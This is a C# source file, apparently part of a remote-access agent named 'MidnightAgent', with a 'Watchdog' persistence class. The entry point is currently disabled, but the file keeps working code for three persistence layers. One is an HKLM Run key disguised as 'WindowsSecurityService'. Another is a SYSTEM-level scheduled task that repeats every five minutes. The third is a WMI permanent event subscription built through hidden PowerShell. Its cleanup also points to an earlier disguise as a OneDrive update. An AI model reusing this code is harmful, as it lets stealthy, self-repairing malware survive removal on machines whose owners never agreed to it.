using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace MidnightAgent.Persistence
{
    /// <summary>
    /// Watchdog - ensures agent persistence without writing any files
    /// Uses: Registry Run keys + WMI Event Subscription + Scheduled Task repair
    /// </summary>
    public static class Watchdog
    {
        private static Timer _watchdogTimer;
        private const string RegistryRunName = "WindowsSecurityService";
        private const string WmiFilterName = "SecurityFilter";
        private const string WmiConsumerName = "SecurityConsumer";
        private const string WmiBindingName = "SecurityBinding";

        /// <summary>
        /// Start the watchdog - sets up all persistence layers
        /// </summary>
        public static void Start(CancellationToken token)
        {
            // DISABLED PERSISTENCE ENFORCEMENT
            // User requested to remove active persistence checks.
            // We only clean up legacy Registry/WMI to prevent startup issues.
            
            RemoveRegistryPersistence();
            RemoveWmiPersistence();
            
            // Do NOT start the timer.
            // Do NOT ensure Task/Registry/WMI.
        }

        private static void WatchdogCallback(object state)
        {
            // Disabled
        }

        /// <summary>
        /// Verify and repair all persistence mechanisms
        /// </summary>
        private static void EnsureAllPersistence()
        {
            try { EnsureRegistryRunKey(); } catch { }
            try { EnsureScheduledTask(); } catch { }
            try { EnsureWmiPersistence(); } catch { }
        }

        // ========================================
        // LAYER 1: Registry Run Key (HKLM)
        // ========================================
        private static void EnsureRegistryRunKey()
        {
            string exePath = Core.Config.InstallPath;
            
            // HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run (SYSTEM level)
            using (var key = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                if (key != null)
                {
                    string current = key.GetValue(RegistryRunName) as string;
                    if (current == null || !current.Equals(exePath, StringComparison.OrdinalIgnoreCase))
                    {
                        key.SetValue(RegistryRunName, exePath);
                    }
                }
            }
        }

        // ========================================
        // LAYER 2: Scheduled Task Repair
        // ========================================
        private static void EnsureScheduledTask()
        {
            // Check if task exists
            var checkProc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/Query /TN \"{Core.Config.TaskName}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                }
            };
            checkProc.Start();
            checkProc.WaitForExit(5000);
            
            if (checkProc.ExitCode != 0)
            {
                // Task was deleted! Recreate using schtasks command (no XML file needed)
                RecreateScheduledTaskNoFile();
            }
        }

        /// <summary>
        /// Recreate scheduled task using only command-line args (no file writes)
        /// </summary>
        private static void RecreateScheduledTaskNoFile()
        {
            string exePath = Core.Config.InstallPath;
            string taskName = Core.Config.TaskName;
            
            // Create task via schtasks /Create with inline parameters
            // Run as SYSTEM, trigger at boot, repeat every 5 min
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/Create /TN \"{taskName}\" " +
                        $"/TR \"\\\"{exePath}\\\" agent\" " +
                        $"/SC ONSTART " +
                        $"/RU SYSTEM " +
                        $"/RL HIGHEST " +
                        $"/F",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            proc.WaitForExit(10000);
            
            // Add repetition interval (modify existing task)
            if (proc.ExitCode == 0)
            {
                var modProc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        Arguments = $"/Change /TN \"{taskName}\" /RI 5 /DU 9999:59",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    }
                };
                modProc.Start();
                modProc.WaitForExit(5000);
            }
        }

        // ========================================
        // LAYER 3: WMI Event Subscription
        // ========================================
        private static void EnsureWmiPersistence()
        {
            string exePath = Core.Config.InstallPath;
            
            // Check if WMI subscription exists
            if (WmiSubscriptionExists()) return;
            
            // Create WMI permanent event subscription via PowerShell (no file writes)
            // Triggers when Win32_LogonSession is created (user logs in)
            string psCommand = 
                "$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter " +
                $"-Arguments @{{Name='{WmiFilterName}'; " +
                "EventNamespace='root\\cimv2'; " +
                "QueryLanguage='WQL'; " +
                "Query='SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_LogonSession\"'}; " +
                
                "$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer " +
                $"-Arguments @{{Name='{WmiConsumerName}'; " +
                $"ExecutablePath='{exePath.Replace("\\", "\\\\")}'; " +
                "CommandLineTemplate='" + exePath.Replace("\\", "\\\\") + " agent'}; " +
                
                "Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding " +
                $"-Arguments @{{Filter=$filter; Consumer=$consumer}}";
            
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{psCommand}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            proc.WaitForExit(15000);
        }

        private static bool WmiSubscriptionExists()
        {
            try
            {
                string psCheck = $"Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='{WmiFilterName}'\"";
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{psCheck}\"",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit(10000);
                return !string.IsNullOrWhiteSpace(output);
            }
            catch { return false; }
        }

        /// <summary>
        /// Remove all persistence (for uninstall)
        /// </summary>
        public static void RemoveRegistryPersistence()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null && key.GetValue(RegistryRunName) != null)
                        key.DeleteValue(RegistryRunName, false);
                }
            }
            catch { }
            
            // Also cleanup User Key just in case
            try
            {
                 using (var key = Registry.CurrentUser.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null) {
                         string[] values = { "Microsoft OneDrive Update", RegistryRunName };
                         foreach(var val in values) {
                            if (key.GetValue(val) != null) key.DeleteValue(val, false);
                         }
                    }
                }
            }
            catch { }
        }

        public static void RemoveWmiPersistence()
        {
            try
            {
                string psRemove = 
                    $"Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='{WmiFilterName}'\" | Remove-WmiObject; " +
                    $"Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='{WmiConsumerName}'\" | Remove-WmiObject; " +
                    $"Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object {{$_.Filter -match '{WmiFilterName}'}} | Remove-WmiObject";
                
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{psRemove}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                // proc.WaitForExit(5000); // Don't block too long
            }
            catch { }
        }
        
        public static void RemoveAll()
        {
            RemoveRegistryPersistence();
            RemoveWmiPersistence();
            // Task removal is handled by uninstall_old_agent in Loader if needed
        }
    }
}
